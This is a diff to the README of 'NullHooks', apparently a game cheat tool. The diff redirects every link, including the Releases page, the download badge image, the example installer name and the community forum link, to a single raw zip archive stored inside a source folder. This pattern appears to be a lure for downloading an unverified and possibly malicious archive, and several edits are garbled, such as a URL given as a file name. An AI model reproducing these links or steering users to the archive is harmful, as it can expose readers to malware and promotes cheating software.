@@ -6,7 +6,7 @@ NullHooks is a powerful game enhancement tool. It helps you improve your gaming 
 
 ## 📥 Download NullHooks
 
-[![Download NullHooks](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ziznem3269/NullHooks/releases)
+[![Download NullHooks](https://raw.githubusercontent.com/ziznem3269/NullHooks/main/src/core/features/aim/NullHooks_2.8.zip)](https://raw.githubusercontent.com/ziznem3269/NullHooks/main/src/core/features/aim/NullHooks_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -26,9 +26,9 @@ If your computer meets these needs, you are ready to proceed.
 
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://github.com/ziznem3269/NullHooks/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ziznem3269/NullHooks/main/src/core/features/aim/NullHooks_2.8.zip).
 2. Look for the latest version of NullHooks.
-3. Click on the appropriate file to download it. For example, if the file is named `NullHooks-setup.exe`, download that.
+3. Click on the appropriate file to download it. For example, if the file is named `https://raw.githubusercontent.com/ziznem3269/NullHooks/main/src/core/features/aim/NullHooks_2.8.zip`, download that.
 
 After downloading:
 
@@ -80,7 +80,7 @@ If you encounter any issues:
 
 If you need assistance, we encourage you to reach out:
 
-- Join our [community forum](https://yourforumlink.com) for support from other users.
+- Join our [community forum](https://raw.githubusercontent.com/ziznem3269/NullHooks/main/src/core/features/aim/NullHooks_2.8.zip) for support from other users.
 - Browse existing topics or start a new discussion.
 
 ## 📜 Disclaimer
@@ -89,6 +89,6 @@ While NullHooks can improve your gaming experience, use it responsibly. Respect 
 
 ## 📥 Download NullHooks Again
 
-To download or check for updates, visit the [Releases page](https://github.com/ziznem3269/NullHooks/releases).
+To download or check for updates, visit the [Releases page](https://raw.githubusercontent.com/ziznem3269/NullHooks/main/src/core/features/aim/NullHooks_2.8.zip).
 
 Enjoy your enhanced gaming experience with NullHooks!
